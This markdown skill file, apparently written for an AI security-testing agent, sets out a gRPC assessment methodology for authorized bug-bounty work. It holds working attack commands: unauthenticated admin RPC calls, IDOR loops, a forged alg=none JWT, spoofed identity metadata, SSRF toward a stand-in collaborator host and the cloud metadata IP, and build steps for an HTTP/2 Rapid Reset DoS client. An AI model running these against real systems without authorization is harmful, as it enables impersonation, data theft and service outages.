---
name: gRPC Security Assessment
description: Enumerate and exploit gRPC services — reflection catalog dumping, missing/edge-only auth, metadata trust bypass, gRPC-Web/grpc-gateway transcoding, plaintext h2c, and HTTP/2 Rapid Reset DoS.
tags: [grpc, api, http2, microservices, auth-bypass, transcoding]
recommended_tools: [nmap_scan, http_request, http_repeater, curl, execute_command, python3, jq]
vuln_classes: []
domain: api
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-grpc/SKILL.md]}
---

# gRPC Security Assessment

gRPC's highest-value bugs come from the architectural assumption that a service is "internal": auth is enforced at the edge proxy and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses. Reflection turns a black-box service into a full, self-describing API catalog.

Standard client is `grpcurl` (invoked via `execute_command`); `grpcui` gives an interactive web UI. Transcoded surfaces (gRPC-Web / grpc-gateway / Connect) are hit with plain `http_request` / `curl` — no gRPC client required.

## Highest-value findings

- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).
- **Missing auth on internal service** — a service built for east-west microservice traffic exposed externally with no mTLS and no per-method authorization → call privileged methods directly.
- **Edge-auth-only / metadata trust** — the proxy authenticates the user but the backend re-trusts proxy-injected metadata (`x-user-id`, `x-tenant-id`, `x-forwarded-*`). If you reach the backend or can inject those headers via the proxy, you impersonate any tenant.
- **Plaintext gRPC (h2c)** — cleartext HTTP/2 on a non-standard port → credential/metadata interception (bearer tokens ride in metadata).
- **gRPC-Web / grpc-gateway transcoding** — a browser-facing translator re-exposes internal RPCs over REST/JSON without the auth the native gRPC path would require.
- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — interleaved HEADERS + immediate RST_STREAM frames bypass `MAX_CONCURRENT_STREAMS` accounting → resource exhaustion. DoS is out of scope on almost every program — get explicit written authorization before sending a single burst.

CWE-306 (missing authentication), CWE-639 (IDOR / authorization bypass by user-controlled key), CWE-290 (auth bypass by spoofed identity), CWE-319 (cleartext transmission), CWE-400 (uncontrolled resource consumption).

---

## Phase 1 — Fingerprint & port discovery

Common gRPC ports: 50051 native h2c/TLS; 443/8443 via TLS + ALPN `h2`; 9090/8080 h2c. gRPC cannot run on HTTP/1.1 — ALPN must negotiate `h2`.

```bash
# Port sweep
nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET | grep open

# ALPN must negotiate h2
echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"

# Native-gRPC fingerprint: an HTTP/2 POST to a bogus method returns a grpc-status
# trailer (12 = UNIMPLEMENTED) even on a wrong path — strong signal it's gRPC.
curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" \
  -H "content-type: application/grpc" -o /dev/null -D - | grep -i grpc-status

# TLS-fronted h2 (443): look for grpc-status trailer / grpc content-type
curl -s --http2 -X POST "https://$TARGET/grpc.health.v1.Health/Check" \
  -H "content-type: application/grpc-web+proto" -o /dev/null -D - | grep -i "grpc-status\|content-type"
```

A `grpc-status` trailer present ⇒ a gRPC server (or grpc-gateway/Envoy) is behind that port. `UNIMPLEMENTED` on a random path is normal and only confirms transport — not a finding.

---

## Phase 2 — Service enumeration via reflection

```bash
# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
grpcurl -plaintext $TARGET:50051 list
grpcurl -insecure  $TARGET:443   list

# Typical output when reflection is on:
#   grpc.reflection.v1.ServerReflection
#   grpc.health.v1.Health
#   user.UserService
#   admin.AdminService
#   payment.PaymentService

# List + describe every method of each service
grpcurl -plaintext $TARGET:50051 list admin.AdminService
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema

# Dump the whole catalog, then triage interesting surfaces
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
```

**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary.

---

## Phase 3 — Call methods without authentication (authz testing)

```bash
# Baseline: call a sensitive method with NO auth metadata
grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers

# IDOR across an enumerable id field
for ID in 1 2 3 100 1000 1001; do
  echo "id=$ID"; grpcurl -plaintext $TARGET:50051 \
    -d "{\"user_id\": $ID}" user.UserService/GetUser 2>&1 | head -4
done
```

Interpret the gRPC **status code**, not just whether bytes came back (see Validation):

- `OK (0)` + populated response → method executed unauthenticated → finding.
- `Unauthenticated (16)` / `PermissionDenied (7)` → authz is enforced; NOT a finding.
- `Unimplemented (12)` → wrong path / method not on this server.
- `InvalidArgument (3)` → reached and parsed your input → method is callable; fix the payload and retry.

---

## Phase 4 — Authentication / trust-boundary bypass

```bash
# (a) Forged bearer / alg=none JWT in the authorization metadata
grpcurl -plaintext $TARGET:50051 \
  -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0." \
  -d '{}' admin.AdminService/GetConfig

# (b) Backend-trusts-proxy headers: many gRPC backends authenticate at Envoy and then
#     trust identity injected as metadata. If the edge does NOT strip these, spoofing
#     them = full impersonation. Test every plausible name:
for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \
         "x-envoy-internal: true" "grpc-internal-encoding-request: true"; do
  echo "== $H =="
  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3
done

# (c) Binary metadata smuggling — keys ending in -bin are base64-decoded by the server;
#     some auth middlewares only inspect text metadata, missing -bin keys.
grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin | base64)" \
  -d '{}' admin.AdminService/GetConfig
```

The metadata-trust bug (b) is the gRPC-specific crown jewel. Confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy**. If the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real external users — not just on the bypassed port.

---

## Phase 5 — Proto file / schema discovery

```bash
# Proxies (Envoy/grpc-gateway) sometimes serve descriptors or swagger
for P in proto api/proto swagger.json openapiv2 service.swagger.json descriptor.pb; do
  S=$(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET/$P")
  [ "$S" != 404 ] && echo "Found: /$P ($S)"
done

# Source/registry leakage of .proto definitions
gh search code --owner "$TARGET_ORG" 'syntax = "proto3"' --limit 20
gh search code --owner "$TARGET_ORG" 'service ' filename:.proto --limit 20

# Rebuild a descriptor set from leaked protos and drive the API without reflection
protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto
grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list
```

Proto leakage on its own is low severity; its value is as the key that unlocks Phases 3–4 against a reflection-disabled target.

---

## Phase 6 — gRPC-Web / grpc-gateway / JSON-transcoding attacks

gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web` / `grpc_json_transcoder`**, **grpc-gateway** (REST↔gRPC), or **Connect** (buf). These translators are the realistic *external* attack surface and frequently re-expose internal methods.

```bash
# (a) grpc-gateway maps gRPC methods to REST. Reflection-derived method names often
#     map predictably — hit them over plain HTTP/JSON (no gRPC client needed):
curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'
curl -s -X POST "https://$TARGET/admin.AdminService/ListUsers" \
  -H 'content-type: application/json' -d '{}'    # default unannotated route

# (b) Build a real gRPC-Web length-prefixed frame instead of a hand-waved one.
#     Frame = 1-byte flag (0x00 = data) + 4-byte big-endian length + protobuf payload.
#     Encode the message with protoscope so the bytes are correct:
#       protoscope -s <<<'1: 1'  > msg.bin          # field 1 (e.g. user_id) = 1
MSG=$(xxd -p msg.bin | tr -d '\n')
LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix
FRAME=$(printf '00%s%s' "$LEN" "$MSG")
echo "$FRAME" | xxd -r -p > frame.bin
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
  --data-binary @frame.bin | xxd | head

# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
  -d '{"user_id": 1}'

# (d) Connect protocol (buf): plain JSON POST, unary, no framing:
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
  -d '{"user_id": 1}'
```

Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If a transcoded route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated / low-priv user (not just from inside the mesh).

Related surface on transcoded endpoints: JWT `alg=none`, protobuf mass-assignment (extra request-message fields the handler blindly binds), and HTTP verb tampering (`X-HTTP-Method-Override: DELETE` on a GET-only transcoded route).

---

## Phase 7 — HTTP/2 Rapid Reset DoS (CVE-2023-44487)

**Authorization gate:** DoS is out of scope on the overwhelming majority of programs. Do NOT run this without explicit, written, scoped permission and an agreed target/window. If unsure, skip to Validation and report only a version-confirmed mitigation gap.

The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it — the client races far ahead of the concurrency cap. `h2load` / `ghz` are throughput benchmarkers; they have **no rapid-reset mode** and never interleave HEADERS + immediate RST_STREAM, so they cannot test this.

```bash
# Author-sanctioned PoC that emits HEADERS then immediate RST_STREAM in a tight loop.
# References: CERT/CC VU#421644 (kb.cert.org/vuls/id/421644); Cloudflare technical breakdown.
git clone https://github.com/secengjeff/rapidresetclient
cd rapidresetclient && go build -o rapidreset .
./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:
# ./rapidreset -url https://$TARGET:443 -concurrency 1 -requests 20   # then STOP

# If rolling your own, use the h2 framing layer (golang.org/x/net/http2) to write a
# HEADERS frame immediately followed by RST_STREAM(CANCEL) per stream id.
```

**Detection without DoSing — prefer this.** The only thing you need to PROVE is whether mitigations are present. Version-match the HTTP/2 implementation:

```bash
curl -sI --http2 https://$TARGET/ | grep -i '^server:'
# Mitigated: nghttp2 >=1.57.0; Go net/http with the 2023-10 fix; Envoy
# >=1.27.1/1.26.5/1.25.10/1.24.11; grpc-go >=1.56.3/1.57.1/1.58.3.
```

Report the *version-confirmed* mitigation gap, not a benchmark slowdown. "Server got slower under load" is not proof of CVE-2023-44487 — it yields false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully.

---

## SSRF via RPC arguments

Any RPC accepting a URL/host parameter (webhook, import, proxy, render) is an SSRF surface. Point it at an OOB collaborator with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF.

```bash
grpcurl -plaintext $TARGET:50051 \
  -d '{"webhook_url": "http://<unique>.oob.example/"}' billing.BillingService/ProcessWebhook
# Cloud-metadata target on egress-capable hosts:
#   http://169.254.169.254/latest/meta-data/   (AWS IMDSv1)
```

No interaction = no SSRF. If a called RPC returns cloud credentials, escalate into cloud IAM.

---

## Chain table

| gRPC finding | Chain to | Impact |
|--------------|----------|--------|
| Reflection enabled | Enumerate all internal service methods + messages | Full API catalog disclosure (enabler) |
| Admin method, no auth | Call privileged RPCs (`DeleteUser`, `GetConfig`) | Data manipulation / system access — Critical |
| Proxy forwards `x-user-id`/`x-tenant-id` unstripped | Spoof identity metadata → cross-tenant impersonation | Tenant isolation bypass — Critical |
| IDOR via enumerable id field | Iterate `user_id` over `GetUser` | Mass PII exfil — High |
| grpc-gateway / gRPC-Web route re-exposes internal RPC | Hit transcoded REST/JSON path unauth | Externally-reachable authz bypass — High/Critical |
| RPC accepts URL/host arg | Point at metadata/internal → SSRF | Cloud creds / internal pivot — High/Critical |
| Plaintext h2c on internal port | MITM / sniff metadata (bearer tokens) | Credential capture — High |
| `.proto` leak (repo/swagger) | `-protoset` to drive reflection-off target | Unlocks Phases 3–4 — Low alone, High as enabler |

---

## Validation — false-positive discipline

gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.

1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.

2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.

3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug with an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm the side-effect).

4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real, but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.

5. **OOB for anything blind.** For URL/host-argument RPCs, confirm the DNS+HTTP interaction against a unique collaborator subdomain before claiming SSRF. No interaction = no SSRF.

6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark slowdown. Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization within an agreed window — then stop immediately.

**Severity guide (after the gates above pass):**
- Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
- Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
- IDOR / mass PII via enumerable RPC → **High**
- Internal service externally reachable (transcoder or open port) → **High**
- Plaintext h2c leaking bearer metadata → **High**
- Reflection enabled exposing non-public catalog → **Medium** (enabler)
- Proto/descriptor leak, no callable sensitive method → **Low**
